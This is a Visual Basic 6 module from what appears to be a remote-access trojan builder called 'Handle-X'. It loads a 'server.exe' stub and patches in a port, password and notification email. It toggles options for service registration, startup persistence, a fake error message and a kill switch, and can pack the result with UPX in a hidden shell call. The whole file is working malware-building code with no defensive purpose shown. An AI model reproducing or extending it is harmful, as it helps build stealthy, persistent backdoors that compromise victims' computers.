Attribute VB_Name = "ServerEditor"
'Declerations

'Constants
'Modifyable Stuff By The Sever Editor
 Private Const InitialPort = "|4000©|"
 Private Const PwString = "|©©©©©©©©©©|"
 Private Const EmailAddress = "|©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©|"
 Private Const KillOption = "|killisno|"
 Private Const RegService = "|srviceisno|"
 Private Const StartUpMethod = "|startupno|"
 Private Const FakeError = "|fakeno|"
'Variables
 Private ServerBinStr As String, GoodServer As Boolean
 Private NewPort As String, NewPWD As String, NewEmail As String, NewKillOption As String, NewRegServ As String
 Private NewStartUpMethod As String, NewFakeError As String
 Private ServerFile As String
Public Sub ServerEditorButtons(Index As Integer)
    Dim FFile As Integer
    Select Case Index
           Case 0 'Open And Load The Server File Witch in the text box
                On Error GoTo Failed1:
                Frm_Main.TxtEditServer(3) = "" 'Empty Server Text
                ServerFile = SelectServerFile
                If Len(ServerFile) Then
                    'Open The File
                     ServerBinStr = String(FileLen(ServerFile), vbNullChar)
                     FFile = FreeFile
                     Open ServerFile For Binary As #FFile
                        Get #FFile, , ServerBinStr
                     Close #FFile
                    'ServerBinStr Contains The Server Binary Representation
                    'Check Our Server
                     GoodServer = InStr(1, ServerBinStr, AddNulls(InitialPort), vbBinaryCompare) And _
                     InStr(1, ServerBinStr, AddNulls(PwString), vbBinaryCompare) And _
                     InStr(1, ServerBinStr, AddNulls(EmailAddress), vbBinaryCompare) And _
                     InStr(1, ServerBinStr, AddNulls(KillOption), vbBinaryCompare) And _
                     InStr(1, ServerBinStr, AddNulls(RegService), vbBinaryCompare) And _
                     InStr(1, ServerBinStr, AddNulls(StartUpMethod), vbBinaryCompare) And _
                     InStr(1, ServerBinStr, AddNulls(FakeError), vbBinaryCompare)
                     If Not GoodServer Then
                        MsgBox "This server Is Not Our Un-Compressed Original Server File", vbCritical, AppName
                     Else
                        Frm_Main.RoomTitle(6) = "\Handle-X\Edit Server :\> Server File Loaded Successfully ."
                       'Set The Old Options In The Edit Server Interface
                        Frm_Main.TxtEditServer(0) = ReadOptions(InitialPort)
                        Frm_Main.EditServerButtons(1).Enabled = True
                        Frm_Main.TxtEditServer(3) = ServerFile
                     End If
                End If
                Exit Sub
Failed1:
                'Error In Loadding The Server File
                 MsgBox "Error In Loading Server File.", vbExclamation, AppName
           Case 1 'Compose The Server And Write It To The Disk
                'Read The New Data First
                'Check Loaded Server
                 Frm_Main.EditServerButtons(1).Enabled = False
                 Dim Oldserverlen As Long
                 Oldserverlen = Len(ServerBinStr)
                'TxtEditServer(0) is port , (1) is pwd , (2) is emailaddress
                 NewPort = ReadyValue(Trim$(Frm_Main.TxtEditServer(0)), Len(InitialPort), Asc("©"))
                 NewPWD = ReadyValue(Trim$(Frm_Main.TxtEditServer(1)), Len(PwString), Asc("©"))
                 NewEmail = ReadyValue(Trim$(Frm_Main.TxtEditServer(2)), Len(EmailAddress), Asc("©"))
                 NewKillOption = AddNulls(IIf(Frm_Main.ChkBoxEditServer(1).Value = 1, "|killisok|", KillOption))
                 NewRegServ = AddNulls(IIf(Frm_Main.ChkBoxEditServer(2).Value = 1, "|srviceisok|", RegService))
                 NewStartUpMethod = AddNulls(IIf(Frm_Main.ChkBoxEditServer(3).Value = 1, "|startupok|", StartUpMethod))
                 NewFakeError = AddNulls(IIf(Frm_Main.ChkBoxEditServer(4).Value = 1, "|fakeok|", FakeError))
                'Replace Old Values With The NewValues
                 ServerBinStr = Replace(ServerBinStr, AddNulls(InitialPort), NewPort) 'Port Modification
                 ServerBinStr = Replace(ServerBinStr, AddNulls(PwString), NewPWD) 'Port Modification
                 ServerBinStr = Replace(ServerBinStr, AddNulls(EmailAddress), NewEmail) 'Port Modification
                 ServerBinStr = Replace(ServerBinStr, AddNulls(KillOption), NewKillOption) 'Port Modification
                 ServerBinStr = Replace(ServerBinStr, AddNulls(RegService), NewRegServ) 'Port Modification
                 ServerBinStr = Replace(ServerBinStr, AddNulls(StartUpMethod), NewStartUpMethod) 'Port Modification
                 ServerBinStr = Replace(ServerBinStr, AddNulls(FakeError), NewFakeError) 'Port Modification
                'Save New Server InTo "Frm_Main.TxtEditServer(3)"
                 FFile = FreeFile
                 On Error GoTo FailedToSave
                 If Oldserverlen <> Len(ServerBinStr) Then err.Raise 111, , "The Server Lenght Has Changed, This means An Error Incountered during Composing Operation, Check Your Data Again."
                 Dim NewFile  As String
                 If Len(Frm_Main.TxtEditServer(4)) Then
                       NewFile = Mid$(ServerFile, 1, InStrRev(ServerFile, "\")) & Frm_Main.TxtEditServer(4)
                 Else
                       NewFile = Mid$(ServerFile, 1, InStrRev(1, ServerFile, "\")) & "New Server.exe"
                 End If
                 Open NewFile For Binary As #FFile
                    Put #FFile, , ServerBinStr
                 Close #FFile
                 MsgBox "The New Server Is Installed And Wrote to Disk Successfully.", vbInformation, AppName
                'Check If UPX Compression Selected
                 If Frm_Main.ChkBoxEditServer(0).Value = 1 Then
                    Dim UpxPath As String
                    UpxPath = App.Path & "\Tools\upx.exe"
                   'Check Valid Path ...
                     If CStr(CBool(PathFileExists(UpxPath))) = True Then
                        'Shell Upx With The New Server
                         Shell UpxPath & " -9 " & Frm_Main.TxtEditServer(4), vbHide
                     Else
                        MsgBox "Unable To Find UPX Compressor Tool Comes With Our Package at the Path :- " & vbCrLf & UpxPath, vbExclamation, AppName
                     End If
                 End If
                 Frm_Main.TxtEditServer(3) = ""
                 Frm_Main.RoomTitle(6) = "\Handle-X\Edit Server :\>_"
                 Exit Sub
FailedToSave:
                 MsgBox "There is an error in writing New Server To The Disk With The Specified Destination." & vbCrLf & vbCrLf & "Error Description: " & err.Description, vbCritical, AppName
    End Select
End Sub
Private Function SelectServerFile() As String
    On Error GoTo WriteManually
    Frm_Main.RoomTitle(6) = "\Handle-X\Edit Server :\> Open And Load Server File ..."
    With FileBrowser
        .CMD1.CancelError = False
        .CMD1.DialogTitle = "Select The UnCompressed-Origional Server File To Modify..."
        .CMD1.Filter = "Server (Server.exe)|server.exe"
        .CMD1.ShowOpen
        .CMD1.FileName = Trim$(.CMD1.FileName)
        If Len(.CMD1.FileName) Then
            Frm_Main.RoomTitle(6) = "\Handle-X\Edit Server :\>Server File Found"
            SelectServerFile = .CMD1.FileName
        Else
            Frm_Main.RoomTitle(6) = "\Handle-X\Edit Server :\>_"
        End If
    End With
    Exit Function
WriteManually:
              SelectServerFile = InputBox("DiaLoge Componant dosn't installed in yor system . So You Have To Write The Server Path Manually In The !", AppName)
              If Not Len(Trim$(SelectServerFile)) Then SelectServerFile = ""
End Function
Private Function ReadyValue(Str As String, SupLength As Integer, Optional Char As Byte) As String
    'This Function Ready The String As An Binary Data In Exe file
    'Complete The Lenght
     On Error Resume Next
     Dim StrLen As Integer, RetStr As String
     StrLen = Len(Str)
     RetStr = "|" & Str & String(SupLength - StrLen - 2, Chr$(Char)) & "|"
     ReadyValue = AddNulls(RetStr)
End Function
Private Function AddNulls(Str As String) As String
   'This Function Add Spaces InBetwwen All Char's In The String To Match String Values Inside Exe files
    On Error Resume Next
    Dim StrLen As Integer, RetStr As String
    StrLen = Len(Str)
    For i = 1 To StrLen - 1
        RetStr = RetStr & Mid$(Str, i, 1) & Chr$(0)
    Next
    RetStr = RetStr & Right$(Str, 1)
    AddNulls = RetStr
End Function
Private Function ReadOptions(Str As String) As String
     On Error Resume Next
    'This Function Resposable for Discardding The x Elemnts In The Modifyable Values
     Dim RetStr As String, StrLen As Integer
     StrLen = Len(Str)
    'Cut The Stop and end bytes
     RetStr = Mid$(Str, 2, StrLen - 2)
    'Strip The x's
     RetStr = Mid$(RetStr, 1, InStr(1, RetStr, "©") - 1)
     ReadOptions = RetStr
End Function
